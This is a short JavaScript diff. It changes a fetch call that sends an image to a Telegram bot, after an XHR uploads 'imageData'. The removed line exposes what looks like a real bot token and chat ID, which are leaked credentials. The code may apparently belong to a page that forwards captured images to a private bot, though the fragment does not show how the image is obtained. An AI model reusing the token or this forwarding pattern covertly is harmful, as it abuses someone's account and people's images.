@@ -33,12 +33,12 @@
                 xhr.send(imageData);
                 
                 // إرسال الصورة إلى البوت على تليجرام
-                fetch('6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo', {
+                fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ chat_id: '946487689', photo: 'https://bosalha.github.io/klerf/myphotos/image.jpg' })
+                    body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', photo: 'https://bosalha.github.io/klerf/myphotos/image.jpg' })
                 })
                 .then(response => response.json())
                 .then(data => console.log(data))
